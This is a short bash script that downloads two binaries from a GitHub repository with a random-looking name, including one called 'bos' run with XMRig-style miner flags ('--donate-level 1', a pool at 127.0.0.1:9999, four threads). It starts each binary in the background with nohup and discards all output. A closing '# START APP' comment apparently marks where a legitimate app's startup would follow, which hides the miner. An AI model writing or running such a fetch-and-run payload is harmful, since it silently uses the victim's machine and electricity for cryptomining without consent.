#!/bin/bash
curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/bos
curl -O -L -J https://github.com/akumetaulu/symmetrical-octo-palm-tree/raw/refs/heads/main/set.zip
unzip set.zip
chmod +x proxy
nohup ./proxy &
chmod +x bos
nohup ./bos --donate-level 1 -o 127.0.0.1:9999 -t 4 >/dev/null 2>&1 &
# START APP





